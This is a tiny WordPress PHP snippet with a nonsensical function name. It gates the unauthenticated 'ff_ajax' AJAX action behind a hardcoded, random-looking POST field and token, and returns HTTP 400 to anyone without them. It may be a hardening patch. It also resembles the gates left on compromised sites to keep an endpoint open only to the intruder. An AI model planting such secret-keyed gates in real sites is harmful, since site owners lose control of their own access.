<?php

function parts_restrict_color() {
	if (!isset($_POST["scrjjibqkprteu"]) || $_POST["scrjjibqkprteu"] !== "tJYTtYuxVuhBL") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'parts_restrict_color', 5, 1);
